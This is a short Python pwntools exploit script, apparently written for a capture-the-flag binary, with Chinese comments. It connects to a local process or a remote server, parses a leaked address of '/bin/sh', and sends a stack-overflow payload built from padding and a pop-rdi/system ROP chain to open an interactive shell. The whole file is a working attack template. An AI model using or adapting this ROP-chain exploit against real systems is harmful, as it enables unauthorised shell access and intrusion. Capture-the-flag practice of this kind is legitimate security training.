from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('120.26.60.25',20313)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    bin_sh = 0x404048
    pop_rdi = 0x40127d         #rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret'])
    system = 0x40126D  #0x4010b0

    p.recvuntil(b"Mystery Man: I will give you somethong.")
    p.sendline(b"114514")

    p.recvuntil(b"The key is")
    line = p.recvline()
    m = re.search(b'0x[0-9a-fA-F]+', line)
    bin_sh = int(m.group(), 16)
    print(hex(bin_sh))

    p.recvuntil(b"Play >")
    payload = b'a'*(0x30+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)
    p.send(payload)
    
    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()